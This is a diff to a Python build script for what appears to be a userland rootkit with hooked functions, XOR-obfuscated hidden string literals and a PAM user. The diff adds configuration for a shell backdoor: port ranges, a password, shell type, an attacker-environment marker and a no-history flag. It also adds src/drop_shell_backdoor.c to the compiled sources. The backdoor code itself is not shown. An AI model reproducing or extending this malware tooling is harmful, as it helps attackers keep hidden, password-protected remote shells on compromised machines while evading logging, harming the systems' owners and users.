@@ -67,6 +67,14 @@ CONFIG_KEYS = {
         "XOR_KEY": type_hexbyte,
         "MAGIC_STRING": type_hidden_literal,
         "PAM_USER": type_hidden_literal,
+        "LOW_BACKDOOR_PORT": type_int,
+        "HIGH_BACKDOOR_PORT": type_int,
+        "PASSWORD": type_hidden_literal,
+        "SHELL_MOTD": type_hidden_literal,
+        "SHELL_TYPE": type_hidden_literal,
+        "_ENV_IS_ATTACKER": type_hidden_literal,
+        "_ENV_NO_HISTFILE": type_hidden_literal,
+        "_ENV_XTERM": type_hidden_literal,
         }
 
 def get_config(lines, check_missing_vars=True):
@@ -233,7 +241,7 @@ num_literals = 0
 
 # add `hidden_literal` types to the list of literals
 literals_macros = []
-macro_tpl = "#define %s ((const char *)(__hidden_literals[%d]))"
+macro_tpl = "#define %s ((char * const)(__hidden_literals[%d]))"
 for key, _type in CONFIG_KEYS.items():
     if _type != type_hidden_literal:
         continue
@@ -320,6 +328,7 @@ def run_build_command(cmd):
 
 SOURCES = [
         "src/init.c",
+        "src/drop_shell_backdoor.c",
         ]
 # automagically add every hooks to SOURCES
 SOURCES += glob("src/hooks/*.c")
